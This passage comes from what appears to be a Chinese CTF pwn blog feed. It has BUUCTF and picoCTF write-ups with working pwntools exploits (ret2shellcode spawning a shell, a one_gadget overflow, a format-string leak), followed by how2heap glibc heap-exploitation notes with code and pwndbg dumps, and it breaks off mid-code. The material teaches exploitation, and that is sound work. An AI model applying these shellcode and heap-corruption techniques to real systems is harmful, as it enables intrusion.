operator">=</span> <span class="token number">0x4f322</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x78</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Please input your code to save'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="wdb-2018-3rd-soEasy"><a href="#wdb-2018-3rd-soEasy" class="headerlink" title="wdb_2018_3rd_soEasy"></a><a href="https://buuoj.cn/challenges#wdb_2018_3rd_soEasy">wdb_2018_3rd_soEasy</a></h2><p><code>32</code>位的<code>ret2shellcode</code>，存在栈溢出并且直接给出了输入变量的地址，直接写入<code>shellcode</code>然后返回到这个变量即可</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-48h] BYREF</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hei,give you a gift->%p\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what do you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27732</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>p <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0x48</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="judgement-mna-2016"><a href="#judgement-mna-2016" class="headerlink" title="judgement_mna_2016"></a><a href="https://buuoj.cn/challenges#judgement_mna_2016">judgement_mna_2016</a></h2><p>格式化字符串漏洞，直接分析题目</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> filename<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+13h] [ebp-15h] BYREF</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-Ch]</span>  v2 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token function">load_flag</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>result <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Loading '%s' failed...\n"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// esp</span>  <span class="token keyword">char</span> format<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-4Ch] BYREF</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+40h] [ebp-Ch]</span>  <span class="token keyword">int</span> <span class="token operator">*</span>p_argc<span class="token punctuation">;</span> <span class="token comment">// [esp+44h] [ebp-8h]</span>  p_argc <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">alloca</span><span class="token punctuation">(</span><span class="token number">144</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Flag judgment system\nInput flag >> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">getnline</span><span class="token punctuation">(</span>format<span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>format<span class="token punctuation">,</span> flag<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nCorrect flag!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>      <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nWrong flag..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Unprintable character"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行前先将<code>flag</code>加载到<code>bss</code>段的变量中，存在栈上的格式化字符串漏洞，直接<code>fmtarg</code>找<code>flag</code>偏移即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> stack<span class="token punctuation">..</span>.<span class="token number">18</span>:0060│  0xffffcf80 —▸ 0xffffcfc8 —▸ 0xffffcff8 ◂— 0x1<span class="token number">19</span>:0064│  0xffffcf84 —▸ 0xf7fe7ae4 <span class="token punctuation">(</span>_dl_runtime_resolve+20<span class="token punctuation">)</span> ◂— pop edx1a:0068│  0xffffcf88 ◂— 0xfbad24881b:006c│  0xffffcf8c —▸ 0xf7e65670 <span class="token punctuation">(</span>__strchr_sse2_bsf<span class="token punctuation">)</span> ◂— endbr32 1c:0070│  0xffffcf90 —▸ 0x804a0a0 <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> ◂— <span class="token string">'flag&#123;test&#125;'</span>1d:0074│  0xffffcf94 —▸ 0xf7ffd990 ◂— 0x01e:0078│  0xffffcf98 ◂— 0x11f:007c│  0xffffcf9c —▸ 0x8048853 <span class="token punctuation">(</span>load_flag+96<span class="token punctuation">)</span> ◂— mov dword ptr <span class="token punctuation">[</span>ebp - 0xc<span class="token punctuation">]</span>, eax<span class="token number">20</span>:0080│  0xffffcfa0 —▸ 0x804a0a0 <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> ◂— <span class="token string">'flag&#123;test&#125;'</span>pwndbg<span class="token operator">></span> fmtarg 0xffffcf90The index of <span class="token function">format</span> argument <span class="token builtin class-name">:</span> <span class="token number">28</span> <span class="token punctuation">(</span><span class="token string">"\%27<span class="token variable">$p</span>"</span><span class="token punctuation">)</span>pwndbg<span class="token operator">></span> fmtarg 0xffffcfa0The index of <span class="token function">format</span> argument <span class="token builtin class-name">:</span> <span class="token number">32</span> <span class="token punctuation">(</span><span class="token string">"\%31<span class="token variable">$p</span>"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不用exp直接发送即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">judgement_mna_2016  <span class="token function">nc</span> node4.buuoj.cn <span class="token number">27773</span>                    Flag judgment systemInput flag <span class="token operator">>></span> %32<span class="token variable">$s</span>flag<span class="token punctuation">&#123;</span>9e28c341-3dea-42b4-9bd0-90c557068e73<span class="token punctuation">&#125;</span>Wrong flag<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="picoctf-2018-buffer-overflow"><a href="#picoctf-2018-buffer-overflow" class="headerlink" title="picoctf_2018_buffer overflow"></a>picoctf_2018_buffer overflow</h2><p>漏洞点出在<code>vuln</code>中<code>strcpy</code>将<code>src</code>复制给<code>dest</code>时可以栈溢出，程序一开始将<code>flag</code>赋到<code>flag</code>变量中，直接盲猜把返回地址填成<code>flag</code>，然后就对了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp-Ch] [ebp-1Ch]</span>  __gid_t v5<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-10h]</span>  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-Ch]</span>  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>stream <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span>      <span class="token string">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">signal</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> sigsegv_handler<span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setresgid</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> argc <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This program takes 1 argument."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Thanks! Received: %s"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> <span class="token operator">*</span>__cdecl <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-18h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp（其中<code>134520960</code>是<code>flag</code>变量地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">CTFMan@out:~$ ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaa134520960flag<span class="token punctuation">&#123;</span>2a8640a2-f9dc-438c-b5ea-31dd2bc13f1f<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how2heap</title>
      <link href="/2023/09/24/how2heap/how2heap-chi-xu-geng-xin-ing/"/>
      <url>/2023/09/24/how2heap/how2heap-chi-xu-geng-xin-ing/</url>
      
        <content type="html"><![CDATA[<p><code>how2heap</code>源码地址：<a href="https://github.com/shellphish/how2heap/tree/master">https://github.com/shellphish/how2heap/tree/master</a></p><p>参考文章：</p><p><a href="https://www.z1r0.top/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/">https://www.z1r0.top/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</a></p><p><a href="https://zikh26.github.io/posts/19609dd.html">https://zikh26.github.io/posts/19609dd.html</a></p><p>本篇去除了所有注释（太占地方啦</p><h2 id="glibc-2-23"><a href="#glibc-2-23" class="headerlink" title="glibc_2.23"></a>glibc_2.23</h2><h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;void main() &#123;void* p1 &#x3D; calloc(1,0x40);free(p1);void* p3 &#x3D; malloc(0x400);        assert(p1 &#x3D;&#x3D; p3);free(p1);void *p4 &#x3D; malloc(0x400);assert(p4 &#x3D;&#x3D; p3);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>p1</code>被释放进入<code>fastbin</code>之后创建大小属于<code>large bin</code>的堆<code>p3</code>，判断完<code>p3</code>不属于<code>fastbin</code>和<code>small bin</code>之后进行<code>malloc consolidate</code>将<code>p1</code>整理到<code>unsorted bin</code>，又被合并到<code>top chunk</code>,在申请堆<code>p3</code>时就从<code>top chunk</code>取的堆，所以<code>p3</code>和<code>p1</code>地址相同，而此时<code>chunk1</code>地址成为了<code>chunk3</code>的地址，再次释放<code>chunk1</code>释放的就是<code>chunk3</code>，再申请与<code>chunk3</code>大小相同的堆时申请到的就是<code>chunk3</code>地址，因此<code>p4 = p3</code>且两个指针都未置零，因为释放的是<code>p1</code></p><h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;        malloc(1);            unsigned long long *a;        unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));            fake_chunks[1] &#x3D; 0x40;         fake_chunks[9] &#x3D; 0x1234;             a &#x3D; &amp;fake_chunks[2];            free(a);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在栈中取了一个地址布置<code>fake_chunk</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffe1b00x7fffffffe1b0: 0x0000000000000001      0x0000000000000040#size0x7fffffffe1c0: 0x00007ffff7ffe168      0x00000000000000f00x7fffffffe1d0: 0x00000000000000c2      0x000055555555542d0x7fffffffe1e0: 0x00007fffffffe20e      0x00000000000000000x7fffffffe1f0: 0x00005555555553e0      0x0000000000001234#next size<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>伪造成功即可释放<code>fake_chunk</code>到<code>bin</code>，其中<code>free</code>的地址是<code>user data</code>地址</p><h3 id="poison-null-byte-x2F-off-by-null"><a href="#poison-null-byte-x2F-off-by-null" class="headerlink" title="poison_null_byte&#x2F;off-by-null"></a>poison_null_byte&#x2F;off-by-null</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;int main()&#123;        setbuf(stdin, NULL);        setbuf(stdout, NULL);        uint8_t* a;        uint8_t* b;        uint8_t* c;        uint8_t* b1;        uint8_t* b2;        uint8_t* d;        void *barrier;        a &#x3D; (uint8_t*) malloc(0x100);        int real_a_size &#x3D; malloc_usable_size(a);            b &#x3D; (uint8_t*) malloc(0x200);        c &#x3D; (uint8_t*) malloc(0x100);            barrier &#x3D;  malloc(0x100);            uint64_t* b_size_ptr &#x3D; (uint64_t*)(b - 8);        *(size_t*)(b+0x1f0) &#x3D; 0x200;        free(b);        a[real_a_size] &#x3D; 0;             uint64_t* c_prev_size_ptr &#x3D; ((uint64_t*)c)-2;            b1 &#x3D; malloc(0x100);        b2 &#x3D; malloc(0x80);        memset(b2,&#39;B&#39;,0x80);            free(b1);        free(c);            d &#x3D; malloc(0x300);            memset(d,&#39;D&#39;,0x300);            assert(strstr(b2, &quot;DDDDDDDDDDDD&quot;));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>条件</strong>：没有<code>tcache</code>且有<code>off-by-one</code>漏洞</p><p>首先创建了四个堆，其中<code>barrier</code>是为了防止释放<code>c</code>时与<code>top chunk</code>合并</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555c000#aSize: 0x111Allocated chunk | PREV_INUSEAddr: 0x55555555c110#bSize: 0x211Allocated chunk | PREV_INUSEAddr: 0x55555555c320#cSize: 0x111Allocated chunk | PREV_INUSEAddr: 0x55555555c430#barrierSize: 0x111Top chunk | PREV_INUSEAddr: 0x55555555c540Size: 0x20ac1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将堆<code>b</code>的末尾伪造成<code>next_chunk</code>的<code>prev_size</code>，使得通过<code>off-by-null</code>修改<code>b</code>的<code>size</code>的后两位为<code>0</code>之后依然能够绕过<code>size = prve_size(next_chunk)</code></p><pre class="line-numbers language-none"><code class="language-none">0x55555555c310: 0x0000000000000200      0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>释放堆<code>b</code>并通过<code>off-by-null</code>将<code>b</code>的大小改成<code>0x200</code>，此时<code>c</code>被识别到伪造的<code>next_chunk</code>处，由于没有修改<code>size</code>位所以<code>size</code>为<code>0</code>，但已经绕过了检查</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555c000Size: 0x111Free chunk (unsortedbin)Addr: 0x55555555c110Size: 0x200fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x55555555c310Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个<code>0x100</code>的堆<code>b1</code>和一个<code>0x80</code>的堆<code>b2</code>,此时堆从<code>unsorted bin</code>中分割，地址在刚刚释放的<code>b</code>处</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555c000Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x55555555c110Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x55555555c220Size: 0x91Free chunk (unsortedbin) | PREV_INUSEAddr: 0x55555555c2b0Size: 0x61fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x55555555c310Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>且真实的<code>c</code>的<code>prve_size</code>没有更新，而是更新了伪造的<code>prve_size</code></p><pre class="line-numbers language-none"><code class="language-none">0x55555555c310: 0x0000000000000060      0x00000000000000000x55555555c320: 0x0000000000000210      0x0000000000000110<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>此时释放<code>b1</code>和<code>c</code>，会将<code>b1</code>和<code>c</code>合并成一个覆盖<code>b2</code>的堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555c000Size: 0x111Free chunk (unsortedbin) | PREV_INUSEAddr: 0x55555555c110Size: 0x321fd: 0x55555555c2b0bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x55555555c430Size: 0x110Top chunk | PREV_INUSEAddr: 0x55555555c540Size: 0x20ac1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时将合并的堆申请出来就能实现<code>overlap</code>，即申请的空间覆盖了<code>b2</code></p><h3 id="house-of-lore-x2F-small-bin"><a href="#house-of-lore-x2F-small-bin" class="headerlink" title="house_of_lore&#x2F;small bin"></a>house_of_lore&#x2F;small bin</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;void jackpot()&#123; fprintf(stderr, &quot;Nice jump d00d\n&quot;); exit(0); &#125;int main(int argc, char * argv[])&#123;  intptr_t* stack_buffer_1[4] &#x3D; &#123;0&#125;;  intptr_t* stack_buffer_2[3] &#x3D; &#123;0&#125;;  intptr_t *victim &#x3D; malloc(0x100);  intptr_t 